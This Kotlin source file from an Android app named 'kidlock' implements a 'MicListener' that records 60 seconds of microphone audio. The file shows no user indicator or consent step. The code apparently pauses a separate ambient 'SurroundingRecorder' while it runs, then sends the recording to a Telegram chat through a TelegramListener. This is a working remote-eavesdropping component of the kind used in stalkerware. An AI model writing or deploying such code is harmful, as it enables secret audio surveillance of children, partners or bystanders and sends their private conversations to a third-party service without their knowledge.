package com.kidlock

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object MicListener {

    private var recorder: MediaRecorder? = null
    private var active = false

    fun listenOnce(context: Context, durationMs: Long = 60_000L) {
        if (active) return
        active = true
        SurroundingRecorder.pause()

        val ts = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val file = File(context.cacheDir, "listen_$ts.mp4")

        try {
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(context)
            else @Suppress("DEPRECATION") MediaRecorder()

            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(128000)
                setOutputFile(file.absolutePath)
                prepare()
                start()
            }

            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    recorder?.apply { stop(); release() }
                    recorder = null
                    active = false
                    if (file.exists() && file.length() > 1024) {
                        val caption = "🎙️ Listen — ${SimpleDateFormat("dd MMM yyyy, HH:mm", Locale.getDefault()).format(Date())}"
                        TelegramListener.instance.sendAudio(file.absolutePath, caption)
                    }
                    SurroundingRecorder.resume()
                } catch (e: Exception) {
                    Log.e("MicListener", "stop error: ${e.message}")
                    active = false
                    SurroundingRecorder.resume()
                }
            }, durationMs)

        } catch (e: Exception) {
            Log.e("MicListener", "start error: ${e.message}")
            active = false
            SurroundingRecorder.resume()
        }
    }
}
